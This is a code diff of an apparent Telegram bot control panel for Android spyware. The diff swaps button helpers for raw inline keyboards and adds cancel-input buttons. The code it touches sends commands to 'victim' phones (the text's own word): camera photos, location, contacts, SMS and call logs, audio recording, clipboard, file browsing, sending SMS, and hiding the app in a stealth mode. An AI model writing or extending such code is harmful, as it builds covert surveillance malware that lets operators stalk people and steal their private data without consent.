@@ -148,15 +148,18 @@ const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) 
     if (navBtns.length > 0) inlineBtns.push(navBtns);
 
     // Back to Menu Button
-    inlineBtns.push([Markup.button.callback('🔙 Menu Utama', `select_dev:${client_id}`), Markup.button.callback('🔄 Ganti Perangkat', 'list_devices')]);
+    inlineBtns.push([
+        { text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}`, style: 'primary' },
+        { text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }
+    ]);
 
     const caption = `📂 <b>File Explorer [${escapeHTML(client_id)}]</b>\n\n📍 Lokasi: <code>${escapeHTML(state.path)}</code>\n📄 Halaman: ${pageNum} dari ${state.totalPages}\n<i>(Klik 📄 File untuk Download)</i>`;
 
     try {
         if (message_id) {
-            await bot.telegram.editMessageText(chat_id, message_id, null, caption, { parse_mode: 'HTML', ...Markup.inlineKeyboard(inlineBtns) });
+            await bot.telegram.editMessageText(chat_id, message_id, null, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
         } else {
-            await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', ...Markup.inlineKeyboard(inlineBtns) });
+            await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
         }
     } catch (tgErr) {
         await bot.telegram.sendMessage(chat_id, '❌ Telegram menolak render tombol direktori: ' + tgErr.message);
@@ -252,11 +255,11 @@ Harus diketik dengan format:
         devices.forEach(d => {
             const isOnline = (Date.now() / 1000 - d.last_seen) < 60;
             const statusIcon = isOnline ? '🟢' : '🔴';
-            buttons.push([Markup.button.callback(`${statusIcon} ${d.id}`, `select_dev:${d.id}`)]);
+            buttons.push([{ text: `${statusIcon} ${d.id}`, callback_data: `select_dev:${d.id}`, style: isOnline ? 'success' : undefined }]);
         });
 
         const caption = '📱 <b>Pilih Target Perangkat:</b>';
-        const opts = { parse_mode: 'HTML', ...Markup.inlineKeyboard(buttons) };
+        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } };
 
         if (isCallback) {
             try { await ctx.editMessageText(caption, opts); }
@@ -274,31 +277,33 @@ Harus diketik dengan format:
     // Menangani klik dari tombol Device yang dipilih
     const sendDeviceMenu = async (ctx, devId, isSecret = false) => {
         const menuBtns = [
-            [Markup.button.callback('📡 Ping', `runcmd:${devId}:ping`), Markup.button.callback('🎯 Lokasi', `runcmd:${devId}:location`)],
-            [Markup.button.callback('📸 Foto (Blkng)', `runcmd:${devId}:photo back`), Markup.button.callback('🤳 Foto (Depan)', `runcmd:${devId}:photo front`)],
-            [Markup.button.callback('📞 Kontak', `runcmd:${devId}:contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd:${devId}:sms_list`)],
-            [Markup.button.callback('📂 File Explorer', `runcmd:${devId}:ls /storage/emulated/0`)],
-            [Markup.button.callback('🔋 Baterai', `runcmd:${devId}:get_battery`), Markup.button.callback('🔦 Torch (Toggle)', `runcmd:${devId}:torch`)],
-            [Markup.button.callback(isSecret ? '🏠 Menu Utama' : '🛠 Fitur Rahasia', isSecret ? `select_dev:${devId}` : `secret_menu:${devId}`)]
+            [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi', callback_data: `runcmd:${devId}:location`, style: 'primary' }],
+            [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
+            [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }],
+            [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
+            [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch (Toggle)', callback_data: `runcmd:${devId}:torch` }],
+            [{ text: isSecret ? '🏠 Menu Utama' : '🛠 Fitur Rahasia', callback_data: isSecret ? `select_dev:${devId}` : `secret_menu:${devId}`, style: isSecret ? 'success' : 'danger' }]
         ];
 
         if (isSecret) {
             menuBtns.splice(0, 5,
-                [Markup.button.callback('✉️ Kirim SMS', `runcmd:${devId}:sms_send`), Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound`)],
-                [Markup.button.callback('🗣 Text to Speech', `runcmd:${devId}:tts`), Markup.button.callback('🔔 Push Notify', `runcmd:${devId}:notify`)],
-                [Markup.button.callback('🌐 Buka URL', `runcmd:${devId}:open_url`), Markup.button.callback('🖼 Set Wallpaper', `runcmd:${devId}:set_wallpaper`)],
-                [Markup.button.callback('📳 Getar HP', `runcmd:${devId}:vibrate`), Markup.button.callback('🚨 Alarm Panik!', `runcmd:${devId}:play_alarm`)],
-                [Markup.button.callback('☎️ Call Log', `runcmd:${devId}:get_call_logs`), Markup.button.callback('📲 Dial Number', `runcmd:${devId}:dial_number`)],
-                [Markup.button.callback('👻 Hide (Stealth)', `runcmd:${devId}:hide_app`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
-                [Markup.button.callback('📦 Daftar App', `runcmd:${devId}:get_installed_apps`), Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`)],
-                [Markup.button.callback('🎵 Play Sound', `runcmd:${devId}:play_sound`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)],
-                [Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)]
+                [{ text: '✉️ Kirim SMS', callback_data: `runcmd:${devId}:sms_send` }, { text: '🔊 Record Audio', callback_data: `runcmd:${devId}:record_sound` }],
+                [{ text: '🗣 Text to Speech', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Push Notify', callback_data: `runcmd:${devId}:notify` }],
+                [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Set Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }],
+                [{ text: '📳 Getar HP', callback_data: `runcmd:${devId}:vibrate` }, { text: '🚨 Alarm Panik!', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
+                [{ text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial Number', callback_data: `runcmd:${devId}:dial_number` }],
+                [{ text: '👻 Hide (Stealth)', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '📻 Info Volume', callback_data: `runcmd:${devId}:get_volume` }],
+                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
+                [{ text: '🎵 Play Sound', callback_data: `runcmd:${devId}:play_sound` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }],
+                [{ text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }]
             );
         }
 
         const isResult = ctx.callbackQuery.message.text && (ctx.callbackQuery.message.text.includes('Respon') || ctx.callbackQuery.message.text.includes('Data'));
         const caption = isResult ? ctx.callbackQuery.message.text.replace('⏳ Menunggu Respon...', '') : `🎯 <b>Menu ${isSecret ? 'Rahasia' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
-        const opts = { parse_mode: 'HTML', ...Markup.inlineKeyboard([...menuBtns, [Markup.button.callback('🔄 Ganti Perangkat', 'list_devices')]]) };
+
+        menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
+        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };
 
         try {
             await ctx.editMessageText(caption, opts);
@@ -333,13 +338,15 @@ Harus diketik dengan format:
         // Jika perintah butuh argumen dan saat ini kosong, minta input user
         if (commandsWithArgs[cmdName] && !cmdText) {
             activeInput[ctx.chat.id] = { devId, command: cmdName };
-            return ctx.reply(`⌨️ <b>Input Diperlukan:</b>\n${commandsWithArgs[cmdName]}`, { parse_mode: 'HTML' });
+            const cancelBtn = { inline_keyboard: [[{ text: '❌ Batal Memasukkan Input', callback_data: 'cancel_input', style: 'danger' }]] };
+            return ctx.reply(`⌨️ <b>Input Diperlukan:</b>\n${commandsWithArgs[cmdName]}`, { parse_mode: 'HTML', reply_markup: cancelBtn });
         }
 
         // Khusus info volume: tampilkan status dulu, tapi juga siapkan form standby untuk set_volume jika pengguna reply
         if (cmdName === 'get_volume') {
             activeInput[ctx.chat.id] = { devId, command: 'set_volume' };
-            ctx.reply(`💡 Untuk **mengubah** volume HP korban, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML' }).catch(() => { });
+            const cancelBtn = { inline_keyboard: [[{ text: '❌ Tutup & Batal Ubah Volume', callback_data: 'cancel_input', style: 'danger' }]] };
+            ctx.reply(`💡 Untuk **mengubah** volume HP korban, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML', reply_markup: cancelBtn }).catch(() => { });
         }
 
         // Dekode shortId jika menggunakan Mapping Path ID
@@ -379,6 +386,16 @@ Harus diketik dengan format:
 
         ctx.answerCbQuery(`Memuat halaman ${pageNum}...`);
         await sendExplorerPage(devId, pageNum, ctx.chat.id, ctx.callbackQuery.message.message_id);
+    });
+
+    bot.action('cancel_input', async (ctx) => {
+        const chatId = ctx.callbackQuery.message.chat.id;
+        if (activeInput[chatId]) {
+            delete activeInput[chatId];
+        }
+        ctx.answerCbQuery('Input Dibatalkan ❌', { show_alert: true }).catch(() => { });
+        // Hapus pesan prompt input nya agar chatting bersih
+        try { await ctx.deleteMessage(); } catch (e) { }
     });
 
     // Menangani input teks bebas dari user (untuk argumen perintah)
@@ -515,9 +532,16 @@ app.post('/response', async (req, res) => {
                 const deviceResponse = data.data !== undefined ? data.data : data;
 
                 // Helper untuk menyematkan tombol di balik setiap respons
-                const getNavOpts = () => Markup.inlineKeyboard([
-                    [Markup.button.callback('🔙 Menu Utama', `select_dev:${client_id}`), Markup.button.callback('🔄 Ganti Perangkat', 'list_devices')]
-                ]);
+                const getNavOpts = () => ({
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}`, style: 'primary' },
+                                { text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }
+                            ]
+                        ]
+                    }
+                });
 
                 const sendOrEdit = async (text, options = {}) => {
                     const finalOpts = { parse_mode: 'HTML', ...getNavOpts(), ...options };
